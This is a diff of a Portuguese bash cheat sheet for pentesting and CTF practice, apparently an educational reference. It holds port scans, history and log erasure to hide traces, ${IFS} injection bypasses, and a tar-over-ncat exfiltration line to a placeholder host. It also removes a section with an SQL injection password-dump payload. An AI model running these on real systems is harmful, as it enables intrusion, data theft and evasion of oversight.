@@ -277,6 +277,8 @@ done
 
 ***
 
+## One Liners
+
 ### 0) Filosofia do fluxo — _Up, edit, enter, repeat_
 
 **Ideia:** repita o ciclo incremental até chegar ao resultado. Exemplo:
@@ -305,27 +307,27 @@ cat file | grep -i open | cut -d, -f3 | sort -V
 
 ### 2) Texto em alta velocidade (grep | sed | awk | cut | sort | uniq | tr | column)
 
-#### grep (buscar)
+### grep (buscar)
 
 ```bash
 grep -RIn --color -C2 "regex" dir
 grep -E 'err(or|ing|ed)' file              # regex estendida
 ```
 
-#### sed (editar stream)
+### sed (editar stream)
 
 ```bash
 sed '1d; s/foo/bar/g' file                 # remove 1ª linha; troca foo→barsed -i '/192\.168\.0\.1/d' /var/log/apache2/access.log
 ```
 
-#### awk (formatar, extrair, somar)
+### awk (formatar, extrair, somar)
 
 ```bash
 awk -F, '{print $1,$3,$6}' OFS=, file.csv  # cortar/remezclar colunas
 awk '{ if (!seen[$0]++) print }' file      # uniq sem ordenar (hash)
 ```
 
-#### cut | sort | uniq | tr | column
+### cut | sort | uniq | tr | column
 
 ```bash
 echo a,b,c,d | cut -d, -f1-3,5
@@ -335,7 +337,7 @@ tr -s '[:space:]' ' ' < in.txt               # normalizar espaços
 ... | column -t                              # tabela bonita
 ```
 
-**Ordenar IPs (POSIX puro):**
+### **Ordenar IPs (POSIX puro):**
 
 ```bash
 sort -t . -nk1,1 -k2,2 -k3,3 -k4,4 ips.txt
@@ -352,7 +354,7 @@ find . -type f -print0 | xargs -0 sha256sum            # NUL‑safe
 awk 'FNR==1{print "===>",FILENAME}1' *.log            # cabeçalho por arquivo
 ```
 
-**Regex com find:**
+### **Regex com find:**
 
 ```bash
 find . -regextype posix-extended -regex '.*/(foo|bar)\.conf'
@@ -380,7 +382,7 @@ lsof -Pan -i :443                        # quem usa 443 (sem DNS)
 ip a; ip r; ip neigh                     # endereços, rotas, vizinhos
 ```
 
-#### netcat (atenção à variante)
+### netcat (atenção à variante)
 
 ```bash
 # Receber
@@ -392,7 +394,7 @@ nc HOST 9000 < file.bin
 nc -znv 192.168.0.1 1-1023 |& grep -v refused
 ```
 
-#### Bash /dev/tcp (portável em muitas distros)
+### Bash /dev/tcp (portável em muitas distros)
 
 ```bash
 # HTTP manual
@@ -401,7 +403,7 @@ exec 3<>/dev/tcp/10.1.1.1/80; echo -e 'GET / HTTP/1.0\n' >&3; cat <&3
 for p in {1..1023}; do : 2>/dev/null > "/dev/tcp/192.168.0.1/$p" && echo $p; done
 ```
 
-#### SSH (tunelamento & file‑copy sem scp)
+### SSH (tunelamento & file‑copy sem scp)
 
 ```bash
 ssh -J user1@host1 user2@host2           # jump host
@@ -418,7 +420,7 @@ ssh user@host cat rfile > lfile          # download tipo scp
 
 **Arquivos que “deduram”:** `~/.bash_history`, `~/.wget-hsts`, `~/.lesshst`, `~/.viminfo`/`*.swp`, `~/.psql_history`, etc.
 
-**Bash mudo:**
+### **Bash mudo:**
 
 ```bash
 unset HISTFILE; export HISTFILE=/dev/null
@@ -426,7 +428,7 @@ ln -sf /dev/null ~/.bash_history
 history -c; kill -9 $$
 ```
 
-**Outros silenciados:**
+### **Outros silenciados:**
 
 ```bash
 wget --no-hsts
@@ -438,7 +440,7 @@ ssh -o UserKnownHostsFile=/dev/null
 
 **“Pegadinhas” de user implicado:** `ssh`, `rdesktop`, `xfreerdp`, `ftp` usam seu username atual se não especificar.
 
-**Higiene local sugerida:**
+### **Higiene local sugerida:**
 
 ```
 ~/.ssh/config         -> User root (se o contexto exigir)
@@ -452,14 +454,14 @@ ssh -o UserKnownHostsFile=/dev/null
 
 ### 7) Exploração quando há limitações
 
-**Sem espaços:**
+### **Sem espaços:**
 
 ```bash
 echo${IFS}this${IFS}has${IFS}no${IFS}spaces
 {echo,this,has,no,spaces}
 ```
 
-**Sem `ls(1)`/`cat(1)`:**
+### **Sem `ls(1)`/`cat(1)`:**
 
 ```bash
 echo *
@@ -468,7 +470,7 @@ while read -r l; do echo "$l"; done < file
 head -n 99999 file
 ```
 
-**“Texto‑only” (transferir binários por canal textual)**
+### **“Texto‑only” (transferir binários por canal textual)**
 
 ```bash
 # Ler binário via base64/hex/etc. (lado receptor decodifica)
@@ -524,65 +526,7 @@ hexdump -ve '"\\\\x" 1/1 "%02x"' shellcode
 
 ***
 
-### 11) SQL 101 (mariaDB) — e pipeline de _CTF‑fu_
-
-**Rotina básica:**
-
-```sql
-SHOW DATABASES; USE db; SHOW TABLES; SELECT * FROM t;
-SELECT * FROM cyberpunk WHERE year_of_release > 2000;
-INSERT INTO cyberpunk (year_of_release,title,duration,has_sequel)
-VALUES (1995,'Ghost in the Shell',126,TRUE);
-SELECT * FROM cyberpunk ORDER BY year_of_release DESC;
-DELETE FROM cyberpunk WHERE title='The Matrix Ressurections';
-```
-
-**Bootstrap:**
-
-```bash
-sudo apt update && sudo apt install -y mariadb-server
-sudo systemctl start mariadb
-sudo mysql_secure_installation
-sudo mysql -u root -p < sql101.sql
-```
-
-**SQLi (conceito):**
-
-```
-SELECT * FROM livros WHERE assunto='Hacking' AND lancado=1
-# Input malicioso ->  '\'' UNION SELECT usuario, senha FROM usuarios--
-# Query final -> SELECT * FROM livros WHERE assunto='' UNION SELECT usuario, senha FROM usuarios--' AND lancado=1
-```
-
-**Pipeline de resolução (exemplo didático de CTF):**
-
-```bash
-curl -s https://termbin.com/4hfm \
-| grep -A5 echo \
-| cut -d ' ' -f2 \
-| grep -v echo \
-| base32 -d \
-| xxd -r -p \
-| base64 -d \
-| rev
-```
-
-**Brutinho com curl + SQLi (extraído e adaptado):**
-
-```bash
-for i in $(seq 1 21 200); do
-  curl -s 'https://example/equipment.php?search='
-  "+UNION+SELECT+1,2,substr(group_concat(secret),$i,21)" \
-; done \
-| grep '<tr><th scope="row">1</td><td>2</td>' \
-| cut -d '>' -f7 | cut -d '<' -f1
-```
-
-> **Blue Team insight:** monitore `UNION SELECT`, `information_schema`, explosões de `substr/substring`, _patterns_ de _time‑based_ e erro‑based.
-
-***
-
-### 12) Dicas MECE (portabilidade & precisão)
+### 11) Dicas MECE (portabilidade & precisão)
 
 * **GNU vs BSD/macOS:** `sed -i` difere; `grep -P` (PCRE) nem sempre existe; `column`/`sort -V` variam.
 * **NUL everywhere:** padronize com `-print0 | xargs -0` para nomes “difíceis”.
@@ -592,27 +536,27 @@ for i in $(seq 1 21 200); do
 
 ***
 
-### 13) Snippets prontos (copiar/colar)
+### 12) Snippets prontos (copiar/colar)
 
-**Top N strings mais comuns:**
+### **Top N strings mais comuns:**
 
 ```bash
 strings bin | tr -s '[:space:]' '\n' | sort | uniq -c | sort -nr | head -20
 ```
 
-**Buscar IOCs (IPs/domínios/hash) em árvore:**
+### **Buscar IOCs (IPs/domínios/hash) em árvore:**
 
 ```bash
 rg -n --hidden -g '!*\.git/*' -e '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' -e '\b[a-f0-9]{32,64}\b' -e '\b[a-z0-9.-]+\.[a-z]{2,}\b'
 ```
 
-**Mini exfil segura (quando autorizado):**
+### **Mini exfil segura (quando autorizado):**
 
 ```bash
 tar czf - dir | openssl enc -aes-256-cbc -salt | ncat --ssl YOURIP 4443
 ```
 
-**Gerar lista de gadgets (ex.: pop rdi; ret) com Ropper:**
+### **Gerar lista de gadgets (ex.: pop rdi; ret) com Ropper:**
 
 ```bash
 ropper --file /lib/x86_64-linux-gnu/libc.so.6 --search 'pop rdi; ret'
@@ -620,7 +564,7 @@ ropper --file /lib/x86_64-linux-gnu/libc.so.6 --search 'pop rdi; ret'
 
 ***
 
-### 14) Referências rápidas
+### 13) Referências rápidas
 
 * Bash Pitfalls; Bash Hackers Wiki; ExplainShell; THC Tips & Tricks; OverTheWire Bandit; LinuxZoo; CAPA/YARA (para signatures).
 * Manuais: `man bash`, `man sed`, `man awk`, `man find`, `man xargs`, `man ssh`, `man ss`, `man ip`, `man lsof`, `man nc`/`ncat`.
